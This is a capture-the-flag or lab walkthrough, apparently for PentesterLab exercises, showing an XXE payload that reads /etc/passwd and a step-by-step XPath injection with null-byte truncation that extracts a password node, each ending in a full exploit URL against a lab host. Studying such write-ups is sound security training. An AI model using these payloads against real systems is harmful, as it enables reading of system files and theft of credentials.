
# Essential: XML Attacks 01

* Some XML parsers will resolve `external entities`, and will allow a user controlling the `XML` message to access resources; for example to read a file on the system. The following entity can be declared, for example:

	* `<!ENTITY x SYSTEM "file:///etc/passwd">`

	* You will need to envelope this properly, in order to get it to work correctly:

```xml
<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
```

* You can then simply use the reference to `x`: `&x;` (don't forget to encode `&`) to get the corresponding result inserted in the `XML` document during its parsing (server side).

* You can access this exercise using the following URL: [http://ptl-8c428f5f-4122497f.libcurl.so/](http://ptl-8c428f5f-4122497f.libcurl.so/) .

* [`http://ptl-c690608d-e331cc83.libcurl.so/?xml=<!DOCTYPE+test+[<!ENTITY+x+SYSTEM+"file:///etc/passwd">]><test>%26x%3b</test>`](http://ptl-c690608d-e331cc83.libcurl.so/?xml=<!DOCTYPE+test+[<!ENTITY+x+SYSTEM+"file:///etc/passwd">]><test>%26x%3b</test>)

# Essential: XML Attacks 02

*  In this example, the code uses the user's input, inside an `XPath` expression. `XPath` is a query language, which selects nodes from an `XML` document. Imagine the XML document as a database, and `XPath` as an `SQL` query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.

* If we inject a `single quote`, we can see the following error:
```
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
```

* Just like `SQL injection`, `XPath` allows you to do boolean logic, and you can try:

	* `' and '1'='1` and you should get the same result.

	* `' or '1'='0` and you should get the same result.

	* `' and '1'='0` and you should not get any result.

	* `' or '1'='1` and you should get all results.

* Based on these tests and previous knowledge of `XPath`, it's possible to get an idea of what the `XPath` expression looks like:

	* `[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]`

* To comment out the rest of the `XPath` expression, you can use a `NULL BYTE` (which you will need to encode as `%00`). As we can see in the `XPath` expression above, we also need to add a `]` to properly complete the syntax. Our payload now looks like hacker`']%00` (or `hacker' or 1=1]%00` if we want all results).

* If we try to find the child of the current node, using the payload `'%20or%201=1]/child::node()%00`, we don't get much information.

* Here, the problem is that we need to get back up in the node hierarchy, to get more information. In `XPath,` this can be done using `parent::*` as part of the payload. We can now select the parent of the current node, and display all the child node using `hacker'%20or%201=1]/parent::*/child::node()%00`.

* One of the node's value looks like a password. We can confirm this, by checking if the node's name is password using the payload `hacker']/parent::*/password%00`.

* You can access this exercise using the following URL: [http://ptl-c3f79f7c-dae6930c.libcurl.so/](http://ptl-c3f79f7c-dae6930c.libcurl.so/) .

* you can inject as follows

* [`http://ptl-c3f79f7c-dae6930c.libcurl.so/?name=%27%20or%201=1]/parent::*/child::node()%00&password=test`](http://ptl-c3f79f7c-dae6930c.libcurl.so/?name=%27%20or%201=1]/parent::*/child::node()%00&password=test)
